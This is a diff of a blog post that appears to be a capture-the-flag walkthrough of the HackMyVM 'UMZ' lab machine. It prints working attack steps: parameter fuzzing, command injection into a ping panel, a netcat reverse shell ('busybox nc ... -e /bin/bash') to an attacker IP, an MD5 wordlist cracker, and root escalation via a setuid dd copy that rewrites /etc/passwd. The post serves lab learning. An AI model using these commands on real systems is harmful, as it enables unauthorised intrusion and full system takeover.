@@ -10,14 +10,18 @@
         let theme = localStorage.getItem("meek_theme") || "light";
         document.documentElement.setAttribute("data-color-mode", theme);
     </script>
-<meta name="description" content="# 1.">
+<meta name="description" content="## Hackmyvm UMZ
+### Initial Scan
+`fping` is similar to `ping`in that it uses ICMP echo requests to determine if a host is responding.">
 <meta property="og:title" content="HackMyVM - umz">
-<meta property="og:description" content="# 1.">
+<meta property="og:description" content="## Hackmyvm UMZ
+### Initial Scan
+`fping` is similar to `ping`in that it uses ICMP echo requests to determine if a host is responding.">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://cyxteen.github.io/post/HackMyVM%20-%20umz.html">
 <meta property="og:image" content="https://avatars.githubusercontent.com/u/49212444?v=4">
 <title>HackMyVM - umz</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -83,35 +87,313 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
 </div>
     <div id="content">
-<div class="markdown-body" id="postBody"><h1>1. Initial scan</h1>
-<pre class="notranslate"><code class="notranslate">└─# arp-scan -l | grep PCS
-192.168.31.8    08:00:27:c0:05:39       PCS Systemtechnik GmbH
-└─# IP=192.168.31.8
-└─# nmap -sV -sC -A $IP -Pn
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 12:58 CST
-Nmap scan report for 13max (192.168.31.8)
+<div class="markdown-body" id="postBody"><h2>Hackmyvm UMZ</h2>
+<h3>Initial Scan</h3>
+<p><code class="notranslate">fping</code> is similar to <code class="notranslate">ping</code>in that it uses ICMP echo requests to determine if a host is responding. My insecure network in VLAN 999 (<code class="notranslate">10.9.9.0/24</code>)</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> -a, show systems that are alive, -g, generate a target list from a supplied IP netmask, -q, quiet and don't show per-target results</span>
+fping -agq 10.9.9.0/24
+
+---response---
+10.9.9.1
+10.9.9.22 - the target host IP address</pre></div>
+<h2>Information Collection</h2>
+<h3>Nmap</h3>
+<p><code class="notranslate">-sS</code> is a TCP SYN scan, <code class="notranslate">-p-</code> is used for checking all 65535 ports, <code class="notranslate">-Pn</code> skip host discovery (treat all hosts as online)</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> this first scan is to check on all open ports</span>
+nmap -sS 10.9.9.22 -p- -Pn
+
+--response---
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 02:38 EDT
+Nmap scan report <span class="pl-k">for</span> 10.9.9.22
+Host is up (0.0027s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</pre></div>
+<h4>Service and version enumeration</h4>
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali :: exercises/HMV/umz » nmap -sSVC 10.9.9.22 -p22,80 -Pn
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 03:07 EDT
+Nmap scan report <span class="pl-k">for</span> 10.9.9.22
 Host is up (0.0019s latency).
-Not shown: 997 closed tcp ports (reset)
+
 PORT   STATE SERVICE VERSION
-21/tcp open  ftp     pyftpdlib 2.0.1
-| ftp-syst:
-|   STAT:
-| FTP server status:
-|  Connected to: 192.168.31.8:21
-|  Waiting for username.
-|  TYPE: ASCII; STRUcture: File; MODE: Stream
-|  Data connection closed.
-|_End of status.
 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
-| ssh-hostkey:
-|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
-|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
-|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
-80/tcp open  http    Apache httpd 2.4.62 ((Debian))
-|_http-title: iCloud Vault Access
-|_http-server-header: Apache/2.4.62 (Debian)
-MAC Address: 08:00:27:C0:05:39 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
-</code></pre></div>
+<span class="pl-k">|</span> ssh-hostkey:
+<span class="pl-k">|</span>   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+<span class="pl-k">|</span>   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+<span class="pl-k">|</span>_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 <span class="pl-s"><span class="pl-pds">((</span>Debian<span class="pl-pds">))</span></span>
+<span class="pl-k">|</span>_http-title: cyber fortress 9000
+<span class="pl-k">|</span>_http-server-header: Apache/2.4.62 (Debian)
+Service Info: OS: Linux<span class="pl-k">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="pl-c1">.</span>
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 6.96 seconds</pre></div>
+<h3>Web Content on Port 80</h3>
+<p>![[Screenshot 2025-08-20 102612.png]]<br>
+Running <code class="notranslate">feroxbuster</code> on the http server</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">feroxbuster -u http://10.9.9.22/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -x php,jpg,jpeg,txt,conf,html</pre></div>
+<p>After running the above command I ended up with two directories.</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">index.html
+index.php</pre></div>
+<p>The file names may have the same name but have different contents. the index.html file has basic text and nothing stands out but as for the <code class="notranslate">index.php</code> it tells us on what the site does.<br>
+Here are the contents from the <code class="notranslate">index.php</code> file<br>
+![[Screenshot 2025-08-20 102643.png]]<br>
+The source code of the page does not reveal anything to us but there's something on the page that catches our eyes. <code class="notranslate">system operational</code> meaning that this page is used by the developer to check for the operational status of the website and detects DDOS attacks.</p>
+<h4>Parameter Fuzzing</h4>
+<p>We are going to check for all the parameters in the <code class="notranslate">index.php</code> file. For this task we are going to use <code class="notranslate">ffuf</code>, an open source tool for fuzzing directories and parameters.</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ffuf -u http://10.9.9.22/index.php<span class="pl-cce">\?</span>FUZZ<span class="pl-cce">\=</span>1 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt</pre></div>
+<p>the <code class="notranslate">-fw</code> flag is used to filter out words. and after running this we got <code class="notranslate">stress</code> as the parameter. when trying to read files using <code class="notranslate">LFI</code> we are unsuccessful</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ffuf -u http://10.9.9.22/index.php<span class="pl-cce">\?</span>FUZZ<span class="pl-cce">\=</span>../../../../../../../etc/passwd -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt</pre></div>
+<p>Since there's nothing we can do with the <code class="notranslate">stress</code> parameter. What we are going to do is to stress the server and check to see if the responses and the number of open ports changes on the server.</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ffuf -u http://10.9.9.22/index.php<span class="pl-cce">\?</span>stress<span class="pl-cce">\=</span>FUZZ -w /usr/share/wordlists/seclists/Fuzzing/6-digits-000000-999999.txt -mc 200 -fw 909</pre></div>
+<p>Remember to include the <code class="notranslate">sleep</code> command so to not overwhelm the server, which could lead to the server freezing and not being able to respond. Use responsibly.<br>
+Some servers when overloaded, a port appears to be opened to a web application," suggests that this is an attempt to trigger a hidden mechanism through server load. This is an  unconventional hidden feature.<br>
+After stressing the server we finally have access to the port <code class="notranslate">8080</code> within the server. and here's the <code class="notranslate">http</code> content.<br>
+![[Pasted image 20250820124730.png]]<br>
+Trying <code class="notranslate">admin:admin</code> as the username and password and bingo we have access to the console.<br>
+![[Screenshot 2025-08-20 124840.png]]<br>
+We can use this panel to ping ip address. It's a simple function where it returns if the ip address entered  is reachable or not.<br>
+![[Screenshot 2025-08-20 125022.png]]<br>
+we can try to <code class="notranslate">RCE</code> by using different characters <code class="notranslate">|</code>, <code class="notranslate">;</code>, <code class="notranslate">&amp;</code>. luckily we are able to run system commands by piping the command we want after the IP address.<br>
+After running this command <code class="notranslate">172.16.1.1;id</code> we get this output<br>
+![[Pasted image 20250820125559.png]]Note the response at the end. The system has run the first command successfully and then executed the command after the <code class="notranslate">;</code> character.<br>
+To get a reverse shell we are going to use the following command <code class="notranslate">172.16.1.1; busybox nc 10.6.6.5 1234 -e /bin/bash</code>, <code class="notranslate">10.6.6.5</code> is the attackers IP address, on the attackers machine we run <code class="notranslate">nc -lvnp 1234</code>.</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali :: exercises/HMV/umz » nc -lvnp 4455
+listening on [any] 4455 ...
+connect to [10.6.6.5] from (UNKNOWN) [10.9.9.22] 41498
+<span class="pl-c1">cd</span>  /home
+whoami
+welcome
+<span class="pl-c1">cd</span> welcome
+ls
+user.txt
+cat user.txt
+flag{user-4483f72525b3c316704cf126bec02d5c}</pre></div>
+<p>In order to gain a more interactive and stable shell we add our attackers ssh public key to the targets authorized keys file</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ls -la
+total 28
+drwxr-xr-x 3 welcome welcome 4096 Aug 19 08:32 <span class="pl-c1">.</span>
+drwxr-xr-x 4 root    root    4096 May  3 10:27 ..
+lrwxrwxrwx 1 root    root       9 May  3 10:26 .bash_history -<span class="pl-k">&gt;</span> /dev/null
+-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout
+-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc
+-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile
+drwxr-xr-x 2 welcome welcome 4096 Aug 19 08:33 .ssh
+-rw-r--r-- 1 root    root      44 May  3 10:26 user.txt
+<span class="pl-c1">cd</span> .ssh
+ls
+authorized_keys
+cat authorized_keys
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJstjRMdt87OXEclXoCNTDu26ys8XEqZQK2X96erxhJ public key to VMs</pre></div>
+<p>from here, we can kill the current shell and login using ssh. I named the ssh key file <code class="notranslate">vuln_vm</code>. I have many ssh files and that's why I had to include the private key in the command</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali :: exercises/HMV/umz » ssh welcome@10.9.9.22 -i <span class="pl-k">~</span>/.ssh/vuln_vm </pre></div>
+<h3>Privilege Escalations</h3>
+<p>Check for all the users that are present on the system</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Umz:/opt/flask-debug$ cat /etc/passwd <span class="pl-k">|</span> grep sh$
+root:x:0:0:root:/root:/bin/bash
+welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
+umzyyds:x:1001:1001:,,,:/home/umzyyds:/bin/bash</pre></div>
+<p>The <code class="notranslate">sudo -l</code> command check to see what commands can the user run as another user.</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Umz:<span class="pl-k">~</span>$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> welcome on Umz:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+
+User welcome may run the following commands on Umz:
+    (ALL) NOPASSWD: /usr/bin/md5sum</pre></div>
+<p>After going through some of the common files, I came across the <code class="notranslate">/opt</code> folder and discovered the source code of the python file that hosts the <code class="notranslate">8080</code> server.</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Umz:<span class="pl-k">~</span>$ ls -la /opt/flask-debug/
+total 20
+drwxr-xr-x 2 welcome welcome 4096 May  3 10:32 <span class="pl-c1">.</span>
+drwxr-xr-x 3 root    root    4096 May  3 09:46 ..
+-rw-r--r-- 1 root    root    5001 May  3 10:23 flask_debug.py
+-rwx------ 1 root    root      10 May  3 10:32 umz.pass
+
+welcome@Umz:/opt/flask-debug$ sudo md5sum umz.pass
+a963fadd7fd379f9bc294ad0ba44f659  umz.pass</pre></div>
+<p>After going through the source codes in the python file, nothing stands out. but there's the <code class="notranslate">umz.pass</code> file that the root user is the only user with permission to access it. Here we copy this file to our attacker's machine and try to crack it using the <code class="notranslate">rockyou.txt</code> wordlist. Here's a python file to automate the process</p>
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-c">#!/usr/bin/env python3</span>
+
+<span class="pl-k">import</span> <span class="pl-s1">hashlib</span>
+<span class="pl-k">import</span> <span class="pl-s1">time</span>
+
+<span class="pl-c1">TARGET_HASH</span> <span class="pl-c1">=</span> <span class="pl-s">"a963fadd7fd379f9bc294ad0ba44f659"</span>
+<span class="pl-c1">WORDLIST_PATH</span> <span class="pl-c1">=</span> <span class="pl-s">"/usr/share/wordlists/rockyou.txt"</span>
+
+<span class="pl-k">def</span> <span class="pl-en">calculate_md5_with_appended_newline</span>(<span class="pl-s1">text_to_hash</span>):
+    <span class="pl-s1">text_with_newline</span> <span class="pl-c1">=</span> <span class="pl-s1">text_to_hash</span> <span class="pl-c1">+</span> <span class="pl-s">"<span class="pl-cce">\n</span>"</span>
+    <span class="pl-k">return</span> <span class="pl-s1">hashlib</span>.<span class="pl-c1">md5</span>(<span class="pl-s1">text_with_newline</span>.<span class="pl-c1">encode</span>(<span class="pl-s">'utf-8'</span>)).<span class="pl-c1">hexdigest</span>()
+
+<span class="pl-k">def</span> <span class="pl-en">main</span>():
+    <span class="pl-k">try</span>:
+        <span class="pl-k">with</span> <span class="pl-en">open</span>(<span class="pl-c1">WORDLIST_PATH</span>, <span class="pl-s">'r'</span>, <span class="pl-s1">encoding</span><span class="pl-c1">=</span><span class="pl-s">'utf-8'</span>, <span class="pl-s1">errors</span><span class="pl-c1">=</span><span class="pl-s">'ignore'</span>) <span class="pl-k">as</span> <span class="pl-s1">f</span>:
+            <span class="pl-en">print</span>(<span class="pl-s">f"Start hash comparison with Wordlist: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">WORDLIST_PATH</span><span class="pl-kos">}</span></span>"</span>)
+            <span class="pl-en">print</span>(<span class="pl-s">f"Target hash: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">TARGET_HASH</span><span class="pl-kos">}</span></span> (expected from 'password<span class="pl-cce">\\</span>n')"</span>)
+
+            <span class="pl-s1">line_count</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>
+            <span class="pl-s1">processed_count</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>
+            <span class="pl-s1">start_time</span> <span class="pl-c1">=</span> <span class="pl-s1">time</span>.<span class="pl-c1">time</span>()
+            <span class="pl-s1">found_password_clean</span> <span class="pl-c1">=</span> <span class="pl-c1">None</span>
+
+            <span class="pl-k">for</span> <span class="pl-s1">line</span> <span class="pl-c1">in</span> <span class="pl-s1">f</span>:
+                <span class="pl-s1">line_count</span> <span class="pl-c1">+=</span> <span class="pl-c1">1</span>
+                <span class="pl-s1">processed_count</span> <span class="pl-c1">+=</span> <span class="pl-c1">1</span>
+
+                <span class="pl-s1">password_candidate_from_file</span> <span class="pl-c1">=</span> <span class="pl-s1">line</span>.<span class="pl-c1">strip</span>()
+
+                <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">password_candidate_from_file</span>:
+                    <span class="pl-k">continue</span>
+
+                <span class="pl-s1">current_hash</span> <span class="pl-c1">=</span> <span class="pl-en">calculate_md5_with_appended_newline</span>(<span class="pl-s1">password_candidate_from_file</span>)
+
+                <span class="pl-k">if</span> <span class="pl-s1">current_hash</span> <span class="pl-c1">==</span> <span class="pl-c1">TARGET_HASH</span>:
+                    <span class="pl-s1">found_password_clean</span> <span class="pl-c1">=</span> <span class="pl-s1">password_candidate_from_file</span>
+                    <span class="pl-s1">end_time</span> <span class="pl-c1">=</span> <span class="pl-s1">time</span>.<span class="pl-c1">time</span>()
+                    <span class="pl-s1">elapsed_time</span> <span class="pl-c1">=</span> <span class="pl-s1">end_time</span> <span class="pl-c1">-</span> <span class="pl-s1">start_time</span>
+                    <span class="pl-en">print</span>(<span class="pl-s">"<span class="pl-cce">\n</span>"</span> <span class="pl-c1">+</span> <span class="pl-s">"*"</span> <span class="pl-c1">*</span> <span class="pl-c1">50</span>)
+                    <span class="pl-en">print</span>(<span class="pl-s">f"PASSWORD FOUND after <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">line_count</span><span class="pl-kos">}</span></span> attempts!"</span>)
+                    <span class="pl-en">print</span>(<span class="pl-s">f"Password (without the trailing <span class="pl-cce">\\</span>n): <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">found_password_clean</span><span class="pl-kos">}</span></span>"</span>)
+                    <span class="pl-en">print</span>(<span class="pl-s">f"Hashed: '<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">found_password_clean</span><span class="pl-kos">}</span></span><span class="pl-cce">\\</span>n'"</span>)
+                    <span class="pl-en">print</span>(<span class="pl-s">f"Generated hash: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">current_hash</span><span class="pl-kos">}</span></span>"</span>)
+                    <span class="pl-en">print</span>(<span class="pl-s">f"Duration: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">elapsed_time</span>:.2f<span class="pl-kos">}</span></span> seconds"</span>)
+                    <span class="pl-en">print</span>(<span class="pl-s">"*"</span> <span class="pl-c1">*</span> <span class="pl-c1">50</span>)
+                    <span class="pl-k">break</span>
+
+                <span class="pl-k">if</span> <span class="pl-s1">processed_count</span> <span class="pl-c1">%</span> <span class="pl-c1">500000</span> <span class="pl-c1">==</span> <span class="pl-c1">0</span>:
+                    <span class="pl-s1">current_time</span> <span class="pl-c1">=</span> <span class="pl-s1">time</span>.<span class="pl-c1">time</span>()
+                    <span class="pl-s1">elapsed_time</span> <span class="pl-c1">=</span> <span class="pl-s1">current_time</span> <span class="pl-c1">-</span> <span class="pl-s1">start_time</span>
+                    <span class="pl-k">if</span> <span class="pl-s1">elapsed_time</span> <span class="pl-c1">&gt;</span> <span class="pl-c1">0</span>:
+                        <span class="pl-s1">rate</span> <span class="pl-c1">=</span> <span class="pl-s1">processed_count</span> <span class="pl-c1">/</span> <span class="pl-s1">elapsed_time</span>
+                        <span class="pl-en">print</span>(<span class="pl-s">f"Processed: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">processed_count</span><span class="pl-kos">}</span></span> words... Rate: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">rate</span>:.0f<span class="pl-kos">}</span></span> W/s"</span>, <span class="pl-s1">end</span><span class="pl-c1">=</span><span class="pl-s">'<span class="pl-cce">\r</span>'</span>)
+
+            <span class="pl-en">print</span>()
+
+            <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">found_password_clean</span>:
+                <span class="pl-s1">end_time</span> <span class="pl-c1">=</span> <span class="pl-s1">time</span>.<span class="pl-c1">time</span>()
+                <span class="pl-s1">elapsed_time</span> <span class="pl-c1">=</span> <span class="pl-s1">end_time</span> <span class="pl-c1">-</span> <span class="pl-s1">start_time</span>
+                <span class="pl-en">print</span>(<span class="pl-s">f"Password NOT found in wordlist '<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">WORDLIST_PATH</span><span class="pl-kos">}</span></span>' after <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">line_count</span><span class="pl-kos">}</span></span> attempts."</span>)
+                <span class="pl-en">print</span>(<span class="pl-s">f"Total duration: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">elapsed_time</span>:.2f<span class="pl-kos">}</span></span> seconds."</span>)
+
+    <span class="pl-k">except</span> <span class="pl-v">FileNotFoundError</span>:
+        <span class="pl-en">print</span>(<span class="pl-s">f"Error: Wordlist not found at '<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">WORDLIST_PATH</span><span class="pl-kos">}</span></span>'"</span>)
+    <span class="pl-k">except</span> <span class="pl-v">Exception</span> <span class="pl-k">as</span> <span class="pl-s1">e</span>:
+        <span class="pl-en">print</span>(<span class="pl-s">f"An unexpected error occurred: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">e</span><span class="pl-kos">}</span></span>"</span>)
+
+<span class="pl-k">if</span> <span class="pl-s1">__name__</span> <span class="pl-c1">==</span> <span class="pl-s">"__main__"</span>:
+    <span class="pl-en">main</span>()</pre></div>
+<p>It's a simple python file that reads the <code class="notranslate">rockyou.txt</code> file and hashes it to <code class="notranslate">md5sum</code> hash and compares it to.</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali :: exercises/HMV/umz » python3 md5cracker.py
+Start <span class="pl-c1">hash</span> comparison with Wordlist: /usr/share/wordlists/rockyou.txt
+Target hash: a963fadd7fd379f9bc294ad0ba44f659 (expected from <span class="pl-s"><span class="pl-pds">'</span>password\n<span class="pl-pds">'</span></span>)
+
+<span class="pl-k">**************************************************</span>
+PASSWORD FOUND after 9982 attempts<span class="pl-k">!</span>
+Password (without the trailing <span class="pl-cce">\n</span>): sunshine3
+Hashed: <span class="pl-s"><span class="pl-pds">'</span>sunshine3\n<span class="pl-pds">'</span></span>
+Generated hash: a963fadd7fd379f9bc294ad0ba44f659
+Duration: 0.01 seconds
+<span class="pl-k">**************************************************</span></pre></div>
+<p>After running the python script, we get the <code class="notranslate">umzyyds</code> password <code class="notranslate">sunshine3</code></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Umz:/opt/flask-debug$ su umzyyds
+Password:
+umzyyds@Umz:<span class="pl-k">~</span>$ id
+uid=1001(umzyyds) gid=1001(umzyyds) groups=1001(umzyyds)
+umzyyds@Umz:<span class="pl-k">~</span>$ sudo -l
+[sudo] password <span class="pl-k">for</span> umzyyds:
+Sorry, user umzyyds may not run sudo on Umz.
+umzyyds@Umz:/opt/flask-debug$ ls -la
+total 20
+drwxr-xr-x 2 welcome welcome 4096 May  3 10:32 <span class="pl-c1">.</span>
+drwxr-xr-x 3 root    root    4096 May  3 09:46 ..
+-rw-r--r-- 1 root    root    5001 May  3 10:23 flask_debug.py
+-rwx------ 1 root    root      10 May  3 10:32 umz.pass
+umzyyds@Umz:/opt/flask-debug$ <span class="pl-c1">cd</span> <span class="pl-k">~</span>
+umzyyds@Umz:<span class="pl-k">~</span>$ ls -la
+total 96
+drwx------ 2 umzyyds umzyyds  4096 May  3 10:42 <span class="pl-c1">.</span>
+drwxr-xr-x 4 root    root     4096 May  3 10:27 ..
+lrwxrwxrwx 1 root    root        9 May  3 10:38 .bash_history -<span class="pl-k">&gt;</span> /dev/null
+-rw-r--r-- 1 umzyyds umzyyds   220 May  3 10:27 .bash_logout
+-rw-r--r-- 1 umzyyds umzyyds  3526 May  3 10:27 .bashrc
+-rwsr-sr-x 1 root    root    76712 May  3 10:42 Dashazi
+-rw-r--r-- 1 umzyyds umzyyds   807 May  3 10:27 .profile</pre></div>
+<p>switch to the <code class="notranslate">umzyyds</code> user and try to gain access to the root user from there onwards. Here we notice the <code class="notranslate">Dashazi</code> binary. notice the <code class="notranslate">suidy</code> bit set for the file, this means we can run the file as root.</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">umzyyds@Umz:<span class="pl-k">~</span>$ file Dashazi
+Dashazi: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="pl-k">for</span> GNU/Linux 3.2.0, BuildID[sha1]=21bfd63cfb732f9c09d17921f8eef619429bcd35, stripped
+umzyyds@Umz:<span class="pl-k">~</span>$ ./Dashazi --version
+dd (coreutils) 8.30
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <span class="pl-k">&lt;</span>https://gnu.org/licenses/gpl.html<span class="pl-k">&gt;</span>.
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+Written by Paul Rubin, David MacKenzie, and Stuart Kemp.</pre></div>
+<p>The <code class="notranslate">dashazi</code> file is a copy of the <code class="notranslate">dd</code> file and following up on the command on <code class="notranslate">GTFObins</code> we can read any file we want.<br>
+To read the root flag</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">umzyyds@Umz:<span class="pl-k">~</span>$ ./Dashazi if=/root/root.txt
+flag{root-a73c45107081c08dd4560206b8ef8205}
+0+1 records <span class="pl-k">in</span>
+0+1 records out
+44 bytes copied, 0.00483868 s, 9.1 kB/s</pre></div>
+<p>Finally we get the root flag. Apart from reading any file we can also write to any file and in any folder.<br>
+To show this we are going to create another passwd file but with another user that we control that has root access.</p>
+<ol>
+<li>create a password hash (password: <code class="notranslate">toor</code>, salt:<code class="notranslate">aa</code>)</li>
+</ol>
+<div class="highlight highlight-source-shell"><pre class="notranslate">umzyyds@Umz:<span class="pl-k">~</span>$ perl -le <span class="pl-s"><span class="pl-pds">'</span>print crypt("toor", "aa")<span class="pl-pds">'</span></span>
+aalIoK7SGUI2k</pre></div>
+<ol start="2">
+<li>Add the new user and their password to the passwd file</li>
+</ol>
+<div class="highlight highlight-source-shell"><pre class="notranslate">umzyyds@Umz:<span class="pl-k">~</span>$ ./Dashazi if=/etc/passwd of=/tmp/passwd.original status=none
+umzyyds@Umz:<span class="pl-k">~</span>$ cp /tmp/passwd.original /tmp/passwd.modified
+umzyyds@Umz:<span class="pl-k">~</span>$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>cyxteen:aalIoK7SGUI2k:0:0:superuser:/root:/bin/bash<span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> /tmp/passwd.modified
+umzyyds@Umz:<span class="pl-k">~</span>$ cat /tmp/passwd.modified
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
+umzyyds:x:1001:1001:,,,:/home/umzyyds:/bin/bash
+cyxteen:aalIoK7SGUI2k:0:0:superuser:/root:/bin/bash</pre></div>
+<ol start="3">
+<li>copy the modified file to the original <code class="notranslate">passwd</code> file. <code class="notranslate">status=none</code> suppresses all the errors</li>
+</ol>
+<div class="highlight highlight-source-shell"><pre class="notranslate">umzyyds@Umz:<span class="pl-k">~</span>$ ./Dashazi if=/tmp/passwd.modified of=/etc/passwd status=none</pre></div>
+<ol start="4">
+<li>Finally</li>
+</ol>
+<div class="highlight highlight-source-shell"><pre class="notranslate">umzyyds@Umz:<span class="pl-k">~</span>$ su cyxteen
+Password:
+root@Umz:/home/umzyyds# whoami
+root
+root@Umz:/home/umzyyds# sudo -l
+Matching Defaults entries <span class="pl-k">for</span> root on Umz:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+
+User root may run the following commands on Umz:
+    (ALL <span class="pl-c1">:</span> ALL) ALL</pre></div></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">comments</button>
